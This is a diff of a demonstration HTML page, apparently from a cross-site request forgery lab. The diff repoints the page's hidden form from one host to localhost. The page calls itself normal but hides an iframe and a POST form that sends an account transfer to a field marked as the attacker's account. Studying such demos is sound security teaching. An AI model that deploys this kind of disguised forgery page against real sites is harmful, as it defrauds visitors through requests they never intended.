@@ -8,7 +8,7 @@
         <h1>This page is normal</h1>
 
         <iframe style="display:none" name="csrf-frame"></iframe>
-        <form method='POST' style="display:none" action='http://csrf.dev/index.php' target="csrf-frame" id="csrf-form">
+        <form method='POST' style="display:none" action='http://localhost/csrf/index.php' target="csrf-frame" id="csrf-form">
             <input name="account" value="2345534534534535">
 
             <input name="toAccount" value="00-210312313-125"><!-- hackers account -->
